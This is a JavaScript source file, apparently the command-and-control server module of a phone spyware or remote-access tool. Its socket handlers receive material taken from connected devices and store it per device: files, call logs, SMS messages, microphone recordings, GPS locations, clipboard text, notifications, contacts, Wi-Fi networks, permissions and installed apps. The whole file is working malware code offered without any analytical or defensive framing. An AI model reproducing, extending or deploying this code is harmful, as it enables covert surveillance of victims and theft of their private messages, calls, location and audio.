// Socket Event Handlers Module
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

class SocketEventHandlers {
    constructor(config, logManager) {
        this.config = config;
        this.logManager = logManager;
    }

    setupFileHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.files, (data) => {
            if (data.type === "list") {
                let list = data.list;
                if (list.length !== 0) {
                    client.get('currentFolder').remove().write();
                    client.get('currentFolder').assign(data.list).write();
                    this.logManager.log(this.config.logTypes.success, "File List Updated");
                }
            } else if (data.type === "download") {
                this.logManager.log(this.config.logTypes.info, "Receiving File From " + clientID);

                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) 
                    ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';

                let filePath = path.join(this.config.downloadsFullPath, fileKey + fileExt);

                fs.writeFile(filePath, data.buffer, (error) => {
                    if (!error) {
                        client.get('downloads').push({
                            time: new Date(),
                            type: "download",
                            originalName: data.name,
                            path: this.config.downloadsFolder + '/' + fileKey + fileExt
                        }).write();
                        this.logManager.log(this.config.logTypes.success, "File From " + clientID + " Saved");
                    } else console.log(error);
                });
            } else if (data.type === "error") {
                console.log(data.error);
            }
        });
    }

    setupCallHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.call, (data) => {
            if (data.callsList) {
                if (data.callsList.length !== 0) {
                    let callsList = data.callsList;
                    let dbCall = client.get('CallData');
                    let newCount = 0;
                    callsList.forEach(call => {
                        let hash = crypto.createHash('md5').update(call.phoneNo + call.date).digest("hex");
                        if (dbCall.find({ hash }).value() === undefined) {
                            call.hash = hash;
                            dbCall.push(call).write();
                            newCount++;
                        }
                    });
                    this.logManager.log(this.config.logTypes.success, clientID + " Call Log Updated - " + newCount + " New Calls");
                }
            }
        });
    }

    setupSmsHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.sms, (data) => {
            if (typeof data === "object") {
                let smsList = data.smslist;
                if (smsList.length !== 0) {
                    let dbSMS = client.get('SMSData');
                    let newCount = 0;
                    smsList.forEach(sms => {
                        let hash = crypto.createHash('md5').update(sms.address + sms.body).digest("hex");
                        if (dbSMS.find({ hash }).value() === undefined) {
                            sms.hash = hash;
                            dbSMS.push(sms).write();
                            newCount++;
                        }
                    });
                    this.logManager.log(this.config.logTypes.success, clientID + " SMS List Updated - " + newCount + " New Messages");
                }
            } else if (typeof data === "boolean") {
                this.logManager.log(this.config.logTypes.success, clientID + " SENT SMS");
            }
        });
    }

    setupMicHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.mic, (data) => {
            if (data.file) {
                this.logManager.log(this.config.logTypes.info, "Receiving " + data.name + " from " + clientID);

                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) 
                    ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';

                let filePath = path.join(this.config.downloadsFullPath, fileKey + fileExt);

                fs.writeFile(filePath, data.buffer, (e) => {
                    if (!e) {
                        client.get('downloads').push({
                            "time": new Date(),
                            "type": "voiceRecord",
                            "originalName": data.name,
                            "path": this.config.downloadsFolder + '/' + fileKey + fileExt
                        }).write();
                    } else {
                        console.log(e);
                    }
                });
            }
        });
    }

    setupLocationHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.location, (data) => {
            if (Object.keys(data).length !== 0 && data.hasOwnProperty("latitude") && data.hasOwnProperty("longitude")) {
                client.get('GPSData').push({
                    time: new Date(),
                    enabled: data.enabled || false,
                    latitude: data.latitude || 0,
                    longitude: data.longitude || 0,
                    altitude: data.altitude || 0,
                    accuracy: data.accuracy || 0,
                    speed: data.speed || 0
                }).write();
                this.logManager.log(this.config.logTypes.success, clientID + " GPS Updated");
            } else {
                this.logManager.log(this.config.logTypes.error, clientID + " GPS Received No Data");
                this.logManager.log(this.config.logTypes.error, clientID + " GPS LOCATION SOCKET DATA" + JSON.stringify(data));
            }
        });
    }

    setupClipboardHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.clipboard, (data) => {
            client.get('clipboardLog').push({
                time: new Date(),
                content: data.text
            }).write();
            this.logManager.log(this.config.logTypes.info, clientID + " ClipBoard Received");
        });
    }

    setupNotificationHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.notification, (data) => {
            let dbNotificationLog = client.get('notificationLog');
            let hash = crypto.createHash('md5').update(data.key + data.content).digest("hex");

            if (dbNotificationLog.find({ hash }).value() === undefined) {
                data.hash = hash;
                dbNotificationLog.push(data).write();
                this.logManager.log(this.config.logTypes.info, clientID + " Notification Received");
            }
        });
    }

    setupContactsHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.contacts, (data) => {
            if (data.contactsList) {
                if (data.contactsList.length !== 0) {
                    let contactsList = data.contactsList;
                    let dbContacts = client.get('contacts');
                    let newCount = 0;
                    contactsList.forEach(contact => {
                        contact.phoneNo = contact.phoneNo.replace(/\s+/g, '');
                        let hash = crypto.createHash('md5').update(contact.phoneNo + contact.name).digest("hex");
                        if (dbContacts.find({ hash }).value() === undefined) {
                            contact.hash = hash;
                            dbContacts.push(contact).write();
                            newCount++;
                        }
                    });
                    this.logManager.log(this.config.logTypes.success, clientID + " Contacts Updated - " + newCount + " New Contacts Added");
                }
            }
        });
    }

    setupWifiHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.wifi, (data) => {
            if (data.networks) {
                if (data.networks.length !== 0) {
                    let networks = data.networks;
                    let dbwifiLog = client.get('wifiLog');
                    client.get('wifiNow').remove().write();
                    client.get('wifiNow').assign(data.networks).write();
                    let newCount = 0;
                    networks.forEach(wifi => {
                        let wifiField = dbwifiLog.find({ SSID: wifi.SSID, BSSID: wifi.BSSID });
                        if (wifiField.value() === undefined) {
                            wifi.firstSeen = new Date();
                            wifi.lastSeen = new Date();
                            dbwifiLog.push(wifi).write();
                            newCount++;
                        } else {
                            wifiField.assign({
                                lastSeen: new Date()
                            }).write();
                        }
                    });
                    this.logManager.log(this.config.logTypes.success, clientID + " WiFi Updated - " + newCount + " New WiFi Hotspots Found");
                }
            }
        });
    }

    setupPermissionsHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.permissions, (data) => {
            client.get('enabledPermissions').assign(data.permissions).write();
            this.logManager.log(this.config.logTypes.success, clientID + " Permissions Updated");
        });
    }

    setupAppsHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.installed, (data) => {
            client.get('apps').assign(data.apps).write();
            this.logManager.log(this.config.logTypes.success, clientID + " Apps Updated");
        });
    }

    // Setup all handlers at once
    setupAllHandlers(socket, clientID, client) {
        this.setupFileHandler(socket, clientID, client);
        this.setupCallHandler(socket, clientID, client);
        this.setupSmsHandler(socket, clientID, client);
        this.setupMicHandler(socket, clientID, client);
        this.setupLocationHandler(socket, clientID, client);
        this.setupClipboardHandler(socket, clientID, client);
        this.setupNotificationHandler(socket, clientID, client);
        this.setupContactsHandler(socket, clientID, client);
        this.setupWifiHandler(socket, clientID, client);
        this.setupPermissionsHandler(socket, clientID, client);
        this.setupAppsHandler(socket, clientID, client);
    }
}

module.exports = SocketEventHandlers;
